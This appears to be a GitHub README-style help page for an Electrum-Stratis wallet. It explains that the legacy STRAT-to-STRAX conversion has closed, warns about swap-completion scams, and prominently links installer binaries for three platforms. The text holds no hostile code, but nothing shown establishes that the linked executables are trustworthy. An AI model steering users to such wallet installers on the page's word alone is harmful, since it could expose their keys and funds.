![Electrum-Stratis](assets/banner-article.png)

# The swap is closed: what that means for coins still held

<p align="center">What ended was a service</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

The conversion window between legacy STRAT and the current chain's asset has ended. Coins that were not converted remain legacy STRAT on the legacy chain, spendable by whoever holds the keys, and no live process converts them today. That is a statement about a closed window, not about the coins being unusable: this wallet still serves the legacy chain and still moves them. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Your situation | What is true now | What is not available |
|---|---|---|
| Coins never converted | They are legacy STRAT, still spendable | A conversion at any rate |
| Coins converted years ago | They are on the current chain | Anything left to claim here |
| A partial conversion | Two balances on two chains | A way to finish it |
| A paper wallet never swept | Its key still controls its coins | A conversion route |
| Someone offering to swap | A private trade, not a process | Any official window |

</div>

The useful distinction is between "closed" and "lost". Closed means the mechanism no longer runs; lost means no key exists. They are different problems, and only one of them is a wallet problem. A holder who never converted still has a spendable balance, a working address and a key they can export; a holder who lost the key has neither, whatever the window did. That asymmetry is worth stating plainly, because most of the anxiety around a closed window is really anxiety about keys that were never backed up.

## Why it happens

A chain migration is an event with a start and an end. The operator runs a conversion for a period, converts what arrives, and stops. After the stop there is no counterparty to issue the new asset, so no amount of tooling on the holder's side can complete a conversion - the mechanism is not a feature of the wallet, it is a service that ended.

That is why this wallet never presents a swap screen. A wallet that offered one would be offering a transaction it cannot settle. What it offers instead is custody of the legacy asset: addresses, keys, sending, receiving, staking, and a seed you can back up.

## Fix

1. **Establish which chain the coins are on.** An explorer names the network; a legacy address prefix identifies the legacy chain. Do this before deciding anything.
2. **Stop looking for a conversion route.** No setting, tool or wallet performs it now, and a site claiming to is either describing history or selling a private trade.
3. **Treat the legacy balance as a balance.** It can be held, sent to another legacy address, or swept into a seed-based wallet. That is the full set of operations, and it is enough for custody.
4. **Ignore "finish your swap" offers.** They arrive by direct message, ask for a seed or a fee, and describe a process that does not exist. The request is the fraud, not the deadline.
5. **Keep the record.** If you converted part of a balance, note which addresses went where; a later question about two balances is answered by that record, not by memory.

Anyone who tells you a window reopened is describing something the chain cannot do. The coins themselves are unaffected by the closure: they sit at legacy addresses and they move with legacy keys. The wallet that holds them is still published, with the current build on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19). What ended was a service, not the chain ([the legacy chain behind Electrum Stratis](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/does-the-legacy-chain-still-run.md), and [a paper wallet that cannot be swept](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paper-wallet-that-cannot-be-swept.md)). There is no operator left to honour it.

## If that did not work

If you believe coins were converted but do not see them, the question is which address received them and on which chain. That is an explorer question before it is a wallet question.

If a paper wallet was never swept, its key still controls its coins on the legacy chain. Sweeping it into a seed-based wallet is possible; converting it is not.

If someone holds coins for you and claims the conversion is pending, ask for the transaction ID on the destination chain. Without one, nothing happened, and the delay is the story.

## Prevention

- Record which chain each balance sits on, with dates.
- Do not pay anyone to "complete" a closed process.
- Keep legacy keys backed up regardless of value.
- Verify addresses by prefix before sending.
- Treat reopen claims as fraud until a transaction ID says otherwise.
- Record which chain each balance sits on, with the date you last checked it.

## FAQ

### Can I still swap STRAT to STRAX?

No. The conversion window is closed and no live process performs it. Legacy STRAT remains on the legacy chain and the current asset remains on its own chain; the two are not interchangeable today.

### Did I lose my coins if I never swapped?

No. They are still at the addresses that hold them, spendable with the keys. What you lost was the opportunity to convert, which is a market outcome, not a custody failure.

### Is there a wallet that can convert them?

No wallet can settle a conversion the operator no longer runs. A wallet that claims to would be promising a counterparty it does not have. This wallet holds and moves the legacy asset and says so plainly.

### What can I actually do with legacy STRAT now?

Hold it, send it to another legacy address, sweep it into a seed-based wallet, and stake it where the chain supports it. Those are real operations on a real chain, and none of them requires a conversion.

<!-- DOWNLOAD-BLOCK -->

Keep the paperwork while it still means something: the deposit transaction id, the date, the credited amount and a copy of the statement. Those four items are what any future question about the conversion will need, and none of them can be reconstructed from a seed or a wallet file. A screenshot of a balance proves far less than a transaction id.

## Related articles

- [Why every price you see is quoted in STRAX](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-prices-are-quoted-in-strax.md)
- [1:10, off-chain, and the CSV that confirmed it](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/the-fixed-conversion-ratio.md)
- [No reference to swapping with an old seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/no-conversion-needed-a-seed.md)
- [STRAT is not STRAX](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-strat-and-strax-differ.md)
